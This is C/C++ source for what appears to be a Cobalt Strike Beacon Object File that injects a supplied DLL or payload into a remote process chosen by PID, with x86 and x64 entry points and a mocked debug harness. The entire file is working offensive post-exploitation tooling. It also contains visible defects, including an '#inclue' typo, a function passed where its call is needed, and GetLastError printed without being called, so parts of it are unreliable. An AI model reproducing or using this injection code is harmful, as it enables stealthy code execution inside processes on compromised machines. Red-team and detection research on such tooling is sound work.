#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"

#if defined _M_X64
#include "debug.x64.h"
#elif defined _M_IX86
#inclue "debug.x86.h"
#endif

#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

extern "C" {
#include "beacon.h"

    /* is this a 64-bit or 32-bit process? */
    BOOL is_wow64(HANDLE process) {
        DFR_LOCAL(KERNEL32, IsWow64Process);
        BOOL bIsWow64 = FALSE;

        if (!IsWow64Process(process, &bIsWow64)) {
            return FALSE;
        }

        return bIsWow64;
    }

    /* check if a process is x64 or not */
    BOOL is_x64_process(HANDLE process) {
        DFR_LOCAL(KERNEL32, GetCurrentProcess);

        if (is_x64() || is_wow64(GetCurrentProcess)) {
            return !is_wow64(process);
        }

        return FALSE;
    }

    DFR(KERNEL32, GetLastError);
    #define GetLastError KERNEL32$GetLastError

    void go(char* args, int len, BOOL x86) {
        HANDLE              hProcess;
        datap               parser;
        int                 pid;
        int                 offset;
        char*               dllPtr;
        int                 dllLen;

        /* Extract the arguments */
        BeaconDataParse(&parser, args, len);
        pid = BeaconDataInt(&parser);
        offset = BeaconDataInt(&parser);
        dllPtr = BeaconDataExtract(&parser, &dllLen);

        /* Open a handle to the process, for injection. */
        hProcess = BeaconOpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            FALSE,
            pid);
        
        if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Unable to open process %d : %d", pid, GetLastError);
            return;
        }

        /* Check that we can inject the content into the process. */
        if (!is_x64_process(hProcess) && x86 == FALSE) {
            BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
            return;
        }
        if (is_x64_process(hProcess) && x86 == TRUE) {
            BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
            return;
        }

        /* inject into the process */
        BeaconInjectProcess(hProcess, pid, dllPtr, dllLen, offset, NULL, 0);

        /* Clean up */
        BeaconCloseHandle(hProcess);
    }

    void gox86(char* args, int alen) {
        go(args, alen, TRUE);
    }

    void gox64(char* args, int alen) {
        go(args, alen, FALSE);
    }
}

#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // To pack arguments for the bof use 
    // bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<int, int, char*>(gox64, 32536, 0, (char*)&debug_dll);

    return 0;
}

#endif